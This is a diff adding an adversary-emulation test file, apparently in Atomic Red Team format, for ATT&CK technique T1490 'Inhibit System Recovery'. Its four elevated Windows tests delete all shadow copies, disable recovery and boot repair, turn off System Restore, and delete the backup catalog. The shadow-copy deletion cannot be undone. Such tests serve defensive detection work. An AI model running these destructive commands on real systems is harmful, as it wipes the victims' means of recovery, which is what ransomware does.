@@ -1,0 +1,61 @@
+attack_technique: T1490
+display_name: "Inhibit System Recovery"
+tactic: Impact
+atomic_tests:
+  - name: "Delete Volume Shadow Copies"
+    auto_generated_guid: d0d0e0f0a1b1c1d1e1f1a2b2c2d2e2f2
+    description: |
+      Deletes all volume shadow copies (common ransomware behavior).
+    supported_platforms:
+      - windows
+    executor:
+      name: command_prompt
+      command: |
+        vssadmin list shadows
+        vssadmin delete shadows /all /quiet
+      cleanup_command: |
+        echo Shadow copies cannot be restored once deleted.
+      elevation_required: true
+
+  - name: "Disable Windows Recovery"
+    auto_generated_guid: e1e1f1a2b2c2d2e2f2a3b3c3d3e3f3a4
+    description: |
+      Disables Windows Recovery Environment and boot repair.
+    supported_platforms:
+      - windows
+    executor:
+      name: command_prompt
+      command: |
+        bcdedit /set {default} recoveryenabled no
+        bcdedit /set {default} bootstatuspolicy ignoreallfailures
+      cleanup_command: |
+        bcdedit /set {default} recoveryenabled yes
+        bcdedit /deletevalue {default} bootstatuspolicy
+      elevation_required: true
+
+  - name: "Disable System Restore"
+    auto_generated_guid: f2f2a3b3c3d3e3f3a4b4c4d4e4f4a5b5
+    description: |
+      Disables System Restore via registry modification.
+    supported_platforms:
+      - windows
+    executor:
+      name: command_prompt
+      command: |
+        reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v DisableSR /t REG_DWORD /d 1 /f
+      cleanup_command: |
+        reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v DisableSR /f >nul 2>&1
+      elevation_required: true
+
+  - name: "Delete Windows Backup Catalog"
+    auto_generated_guid: a3a3b3c3d3e3f3a4b4c4d4e4f4a5b5c5
+    description: |
+      Deletes the Windows Backup catalog.
+    supported_platforms:
+      - windows
+    executor:
+      name: command_prompt
+      command: |
+        wbadmin delete catalog -quiet 2>nul
+        wbadmin get versions 2>nul
+      elevation_required: true
